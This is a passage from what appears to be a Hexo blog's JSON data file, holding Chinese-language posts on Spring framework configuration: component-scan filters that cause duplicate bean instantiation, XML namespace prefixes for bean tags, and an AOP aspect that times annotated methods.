class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"问题小析\"><a href=\"#问题小析\" class=\"headerlink\" title=\"问题小析\"></a>问题小析</h2><p>通过如此配置，发现spring在加载spring-beans.xml时，实例化了一次service，再加载spring-mvc.xml时，实例化了一次controller和一次service，导致spring先后总共实例化二次service的情况发生。</p>\n<h3 id=\"解析方案1\"><a href=\"#解析方案1\" class=\"headerlink\" title=\"解析方案1\"></a>解析方案1</h3><p>spring-mvc.xml扫描时，base-package设置更细粒度的子包。如：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo.controller\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>此配置的含义：只扫描com.martinye.demo.controller包路径下子标签指明的类型，以及<strong>默认的</strong>@Component、@ManagedBean、@Named注解类型。</p>\n<p><strong>注</strong>：子标签与注解类型冲突，以子标签配置为准。</p>\n<h3 id=\"解析方案2\"><a href=\"#解析方案2\" class=\"headerlink\" title=\"解析方案2\"></a>解析方案2</h3><p>设置use-default-filters值为false，其值默认为true。如：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span> <span class=\"attr\">use-default-filters</span>＝\"<span class=\"attr\">false</span>\"&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>此配置的含义：只扫描com.martinye.demo包路径下子标签指明的类型，不自动注册<strong>默认的</strong>@Component、@ManagedBean、@Named注解类型。</p>\n<p><strong>注</strong>：子标签与注解类型冲突，以子标签配置为准。</p>\n<h3 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h3><p>查阅了相关文档，发现：</p>\n<ol>\n<li>spring<code>&lt;context:component-scan&gt;</code>标签处理逻辑会交给org.springframework.context.config.ContextNamespaceHandler处理，然后季托ComponentScanBeanDefinitionParser会读取配置文件信息并组装成org.springframework.context.annotation.ClassPathBeanDefinitionScanner进行处理。</li>\n<li>context:component-scan的子标签，作用有先后顺序，越上面的子标签优先越高。</li>\n<li>use-default-filters为true时，实例化ClassPathBeanDefinitionScanner时，会调用registerDefaultFilters，include @Component、@ManagedBean、@Named注解类；否则不include。之后再添加include-filter和exclude-filter里的逻辑。</li>\n</ol>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ul>\n<li><a href=\"http://jinnianshilongnian.iteye.com/blog/1762632\">context:component-scan扫描使用上的容易忽略的use-default-filters</a></li>\n<li><a href=\"http://liuluo129.iteye.com/blog/1943412\">spring配置中<context:component-scan/>的use-default-filters的作用</a></li>\n</ul>"},{"title":"spring容器标签前缀","date":"2016-02-28T05:53:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n一般地，spring容器标签bean元数据格式为`<bean></bean>`。但是，奇怪的是有的时候必须使用`<beans:bean></beans:bean>`，否则会报错。\n\n## 一、为什么会这样？\n这与spring容器xml配置当前主要的命名空间(xmlns)设置有关。\n由于在同一个xml配置文件中可能会加载多个文档结构定义(DTD)，因此需要使用命名空间来区分开多个DTD中可能相同的文档标签。\n\n例如：spring **tx** schema包含annotation-driven(`<tx:annotation-driven/>`)，同时，spring mvc schema也包含annotation-driven(`<mvc:annotation-driven/>`)\n\n## 二、小结\n对于以上问题描述情况，不需要使用beans前缀的，xmlns是如下情况：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n而对于需要使用beans前缀的，xmlns被修改了，可能是：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/mvc\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n**由此可知**：\n> 使用主命名空间里的标签，命名空间前缀并不是必须的。\n\n## 三、参考文档\nhttp://bbs.csdn.net/topics/340026084\nhttp://www.w3school.com.cn/tags/tag_prop_xmlns.asp","source":"_posts/article/spring/spring容器标签前缀.md","raw":"tags:\n  - spring\n  - issue\n  - java\ncategories:\n  - 后端开发\ntitle: spring容器标签前缀\ndate: 2016-02-28 13:53:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n一般地，spring容器标签bean元数据格式为`<bean></bean>`。但是，奇怪的是有的时候必须使用`<beans:bean></beans:bean>`，否则会报错。\n\n## 一、为什么会这样？\n这与spring容器xml配置当前主要的命名空间(xmlns)设置有关。\n由于在同一个xml配置文件中可能会加载多个文档结构定义(DTD)，因此需要使用命名空间来区分开多个DTD中可能相同的文档标签。\n\n例如：spring **tx** schema包含annotation-driven(`<tx:annotation-driven/>`)，同时，spring mvc schema也包含annotation-driven(`<mvc:annotation-driven/>`)\n\n## 二、小结\n对于以上问题描述情况，不需要使用beans前缀的，xmlns是如下情况：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n而对于需要使用beans前缀的，xmlns被修改了，可能是：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/mvc\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n**由此可知**：\n> 使用主命名空间里的标签，命名空间前缀并不是必须的。\n\n## 三、参考文档\nhttp://bbs.csdn.net/topics/340026084\nhttp://www.w3school.com.cn/tags/tag_prop_xmlns.asp","slug":"article/spring/spring容器标签前缀","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxu6005x5nbt9q5xqqwj","content":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\"></p>\n<p>一般地，spring容器标签bean元数据格式为<code>&lt;bean&gt;&lt;/bean&gt;</code>。但是，奇怪的是有的时候必须使用<code>&lt;beans:bean&gt;&lt;/beans:bean&gt;</code>，否则会报错。</p>\n<h2 id=\"一、为什么会这样？\"><a href=\"#一、为什么会这样？\" class=\"headerlink\" title=\"一、为什么会这样？\"></a>一、为什么会这样？</h2><p>这与spring容器xml配置当前主要的命名空间(xmlns)设置有关。<br>由于在同一个xml配置文件中可能会加载多个文档结构定义(DTD)，因此需要使用命名空间来区分开多个DTD中可能相同的文档标签。</p>\n<p>例如：spring <strong>tx</strong> schema包含annotation-driven(<code>&lt;tx:annotation-driven/&gt;</code>)，同时，spring mvc schema也包含annotation-driven(<code>&lt;mvc:annotation-driven/&gt;</code>)</p>\n<h2 id=\"二、小结\"><a href=\"#二、小结\" class=\"headerlink\" title=\"二、小结\"></a>二、小结</h2><p>对于以上问题描述情况，不需要使用beans前缀的，xmlns是如下情况：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></div><div class=\"line\">\t   <span class=\"attr\">xmlns:beans</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span>&gt;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>而对于需要使用beans前缀的，xmlns被修改了，可能是：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/mvc\"</span></span></div><div class=\"line\">\t   <span class=\"attr\">xmlns:beans</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span>&gt;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>由此可知</strong>：</p>\n<blockquote>\n<p>使用主命名空间里的标签，命名空间前缀并不是必须的。</p>\n</blockquote>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://bbs.csdn.net/topics/340026084\" target=\"_blank\" rel=\"external\">http://bbs.csdn.net/topics/340026084</a><br><a href=\"http://www.w3school.com.cn/tags/tag_prop_xmlns.asp\" target=\"_blank\" rel=\"external\">http://www.w3school.com.cn/tags/tag_prop_xmlns.asp</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" /></p>\n<p>一般地，spring容器标签bean元数据格式为<code>&lt;bean&gt;&lt;/bean&gt;</code>。但是，奇怪的是有的时候必须使用<code>&lt;beans:bean&gt;&lt;/beans:bean&gt;</code>，否则会报错。</p>\n<h2 id=\"一、为什么会这样？\"><a href=\"#一、为什么会这样？\" class=\"headerlink\" title=\"一、为什么会这样？\"></a>一、为什么会这样？</h2><p>这与spring容器xml配置当前主要的命名空间(xmlns)设置有关。<br>由于在同一个xml配置文件中可能会加载多个文档结构定义(DTD)，因此需要使用命名空间来区分开多个DTD中可能相同的文档标签。</p>\n<p>例如：spring <strong>tx</strong> schema包含annotation-driven(<code>&lt;tx:annotation-driven/&gt;</code>)，同时，spring mvc schema也包含annotation-driven(<code>&lt;mvc:annotation-driven/&gt;</code>)</p>\n<h2 id=\"二、小结\"><a href=\"#二、小结\" class=\"headerlink\" title=\"二、小结\"></a>二、小结</h2><p>对于以上问题描述情况，不需要使用beans前缀的，xmlns是如下情况：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></div><div class=\"line\">\t   <span class=\"attr\">xmlns:beans</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>而对于需要使用beans前缀的，xmlns被修改了，可能是：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/mvc\"</span></div><div class=\"line\">\t   <span class=\"attr\">xmlns:beans</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>由此可知</strong>：</p>\n<blockquote>\n<p>使用主命名空间里的标签，命名空间前缀并不是必须的。</p>\n</blockquote>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://bbs.csdn.net/topics/340026084\">http://bbs.csdn.net/topics/340026084</a><br><a href=\"http://www.w3school.com.cn/tags/tag_prop_xmlns.asp\">http://www.w3school.com.cn/tags/tag_prop_xmlns.asp</a></p>\n"},{"title":"spring特性实践 - AOP","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。\n\n\n## 一、创建maven工程\n\n通过STS创建一个maven工程martinye-demo-spring-support。\n\n修改pom.xml文件，添加项目相关依赖如下：\n\n**servlet**\n- javax.servlet-api\n- jstl\n- standard\n- jsp-api\n\n**spring**\n- spring-webmvc\n- aspectjweaver\n\n**log**\n- slf4j-api\n- slf4j-log4j12\n\n**utils**\n- commons-lang3\n- commons-collections\n- commons-io\n- guava\n- fastjson\n\n**test**\n- junit\n- spring-test\n\n\n<!-- more -->\n\n## 二、配置servlet容器\n配置路径：/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/web.xml\n\nweb servlet容器web.xml，添加加载spring容器的配置。\n根据关注点不同，我们把spring容器配置定义分开，如下所示：\n\n### 定义spring root容器\n实例化类对象。\n\n配置如下：\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n```\n\n### 定义spring mvc容器\n处理用户请求。\nspring mvc容器对应的ApplicationContext是spring root容器对应的ApplicationContext的子类对象，可持有spring root容器中注入的类对象。\n\n配置如下：\n``` xml\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n## 三、配置spring-beans.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"true\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <aop:aspectj-autoproxy expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n除Controller以外的Component注解注释的类，自动注入@Required, @Autowired, @PostConstruct, @PreDestroy, @Resource, @PersistenceContext and @PersistenceUnit注释的属性。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 四、配置spring-mvc.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory -->\n  <bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n    <property name=\"prefix\" value=\"/WEB-INF/views/\" />\n    <property name=\"suffix\" value=\".jsp\" />\n  </bean>\n\n  <aop:aspectj-autoproxy expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n禁用默认的包扫描过滤策略，只扫描Controller注解。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 五、创建TimeCost注解\n通过注解来开关是否需要进行方法耗时统计。\n\n``` java\npackage com.martinye.demo.support.annotation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * @description\n * \n * @author yeshaoting\n * @date 2015-05-07 13:45:29\n */\n@Target({ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface TimeCost {\n\n\n}\n\n```\n\n\n## 六、创建TimeCost切面\n\n切面检测加有TimeCost的方法。\n\n为了保证统计完整性，防止多个切面逻辑耗时未计算的问题，我们为切面添加切面优先级。\n此优先级通过在切面类上添加`@Order`注解来完成。\n\n``` java\npackage com.martinye.demo.support.aspect;\n\nimport org.apache.commons.lang3.time.StopWatch;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.Signature;\nimport org.aspectj.lang.annotation.After;\nimport org.aspectj.lang.annotation.AfterReturning;\nimport org.aspectj.lang.annotation.AfterThrowing;\nimport org.aspectj.lang.annotation.Around;\nimport org.aspectj.lang.annotation.Aspect;\nimport org.aspectj.lang.annotation.Before;\nimport org.aspectj.lang.annotation.Pointcut;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.core.annotation.Order;\n\n/**\n * @description 方法耗时切面\n * \n * @author yeshaoting\n * @date 2015-06-11 11:18:06\n */\n@Aspect\n@Order(8)\npublic class TimeCostAspect {\n  \n  private Logger logger = LoggerFactory.getLogger(this.getClass());\n  \n  @Pointcut(\"@annotation(com.martinye.demo.support.annotation.TimeCost)\")\n  public void point() {};\n  \n  @Before(value = \"point()\")\n  public void beforeAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= before advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @After(value = \"point()\")\n  public void afterAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint) throws Throwable {\n    logger.info(\"======= before around advice {} ======\", joinPoint.getSignature().getName());\n    \n    StopWatch clock = new StopWatch();\n    clock.start(); // 计时开始\n    \n    try {\n      joinPoint.proceed();\n    } catch (Exception e) {\n      throw e;\n    } finally {\n      clock.stop(); // 计时结束\n      long timeCost = clock.getTime();\n      Signature sig = joinPoint.getSignature();\n      logger.info(\"execute method {}.{} take time: {}(ms)\", sig.getDeclaringTypeName(),\n          sig.getName(), timeCost);\n      \n      logger.info(\"======= after around advice {} ======\", joinPoint.getSignature().getName());\n    }\n    \n  }\n  \n  @AfterThrowing(value = \"point()\", throwing = \"e\")\n  public void afterThrowingAdvice(JoinPoint joinPoint, Throwable e) {\n    logger.info(\"======= after throwing advice {} ======\", joinPoint.getSignature().getName());\n    logger.info(\" > error info：\" + e.getMessage());\n  }\n  \n  @AfterReturning(value = \"point()\")\n  public void afteReturningAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after returning advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n}\n```\n","source":"_posts/article/spring/spring特性实践 - AOP.md","raw":"categories:\n  - 后端开发\ntags:\n  - aop\n  - java\n  - spring\n  - 实践\ntitle: spring特性实践 - AOP\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。\n\n\n## 一、创建maven工程\n\n通过STS创建一个maven工程martinye-demo-spring-support。\n\n修改pom.xml文件，添加项目相关依赖如下：\n\n**servlet**\n- javax.servlet-api\n- jstl\n- standard\n- jsp-api\n\n**spring**\n- spring-webmvc\n- aspectjweaver\n\n**log**\n- slf4j-api\n- slf4j-log4j12\n\n**utils**\n- commons-lang3\n- commons-collections\n- commons-io\n- guava\n- fastjson\n\n**test**\n- junit\n- spring-test\n\n\n<!-- more -->\n\n## 二、配置servlet容器\n配置路径：/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/web.xml\n\nweb servlet容器web.xml，添加加载spring容器的配置。\n根据关注点不同，我们把spring容器配置定义分开，如下所示：\n\n### 定义spring root容器\n实例化类对象。\n\n配置如下：\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n```\n\n### 定义spring mvc容器\n处理用户请求。\nspring mvc容器对应的ApplicationContext是spring root容器对应的ApplicationContext的子类对象，可持有spring root容器中注入的类对象。\n\n配置如下：\n``` xml\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n## 三、配置spring-beans.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"true\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <aop:aspectj-autoproxy expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n除Controller以外的Component注解注释的类，自动注入@Required, @Autowired, @PostConstruct, @PreDestroy, @Resource, @PersistenceContext and @PersistenceUnit注释的属性。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 四、配置spring-mvc.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory -->\n  <bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n    <property name=\"prefix\" value=\"/WEB-INF/views/\" />\n    <property name=\"suffix\" value=\".jsp\" />\n  </bean>\n\n  <aop:aspectj-autoproxy expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n禁用默认的包扫描过滤策略，只扫描Controller注解。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 五、创建TimeCost注解\n通过注解来开关是否需要进行方法耗时统计。\n\n``` java\npackage com.martinye.demo.support.annotation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * @description\n * \n * @author yeshaoting\n * @date 2015-05-07 13:45:29\n */\n@Target({ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface TimeCost {\n\n\n}\n\n```\n\n\n## 六、创建TimeCost切面\n\n切面检测加有TimeCost的方法。\n\n为了保证统计完整性，防止多个切面逻辑耗时未计算的问题，我们为切面添加切面优先级。\n此优先级通过在切面类上添加`@Order`注解来完成。\n\n``` java\npackage com.martinye.demo.support.aspect;\n\nimport org.apache.commons.lang3.time.StopWatch;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.Signature;\nimport org.aspectj.lang.annotation.After;\nimport org.aspectj.lang.annotation.AfterReturning;\nimport org.aspectj.lang.annotation.AfterThrowing;\nimport org.aspectj.lang.annotation.Around;\nimport org.aspectj.lang.annotation.Aspect;\nimport org.aspectj.lang.annotation.Before;\nimport org.aspectj.lang.annotation.Pointcut;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.core.annotation.Order;\n\n/**\n * @description 方法耗时切面\n * \n * @author yeshaoting\n * @date 2015-06-11 11:18:06\n */\n@Aspect\n@Order(8)\npublic class TimeCostAspect {\n  \n  private Logger logger = LoggerFactory.getLogger(this.getClass());\n  \n  @Pointcut(\"@annotation(com.martinye.demo.support.annotation.TimeCost)\")\n  public void point() {};\n  \n  @Before(value = \"point()\")\n  public void beforeAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= before advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @After(value = \"point()\")\n  public void afterAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint) throws Throwable {\n    logger.info(\"======= before around advice {} ======\", joinPoint.getSignature().getName());\n    \n    StopWatch clock = new StopWatch();\n    clock.start(); // 计时开始\n    \n    try {\n      joinPoint.proceed();\n    } catch (Exception e) {\n      throw e;\n    } finally {\n      clock.stop(); // 计时结束\n      long timeCost = clock.getTime();\n      Signature sig = joinPoint.getSignature();\n      logger.info(\"execute method {}.{} take time: {}(ms)\", sig.getDeclaringTypeName(),\n          sig.getName(), timeCost);\n      \n      logger.info(\"======= after around advice {} ======\", joinPoint.getSignature().getName());\n    }\n    \n  }\n  \n  @AfterThrowing(value = \"point()\", throwing = \"e\")\n  public void afterThrowingAdvice(JoinPoint joinPoint, Throwable e) {\n    logger.info(\"======= after throwing advice {} ======\", joinPoint.getSignature().getName());\n    logger.info(\" > error info：\" + e.getMessage());\n  }\n  \n  @AfterReturning(value = \"point()\")\n  public void afteReturningAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after returning advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n}\n```\n","slug":"article/spring/spring特性实践 - AOP","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxu800615nbtqrhzbghj","content":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\"></p>\n<p>此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。</p>\n<h2 id=\"一、创建maven工程\"><a href=\"#一、创建maven工程\" class=\"headerlink\" 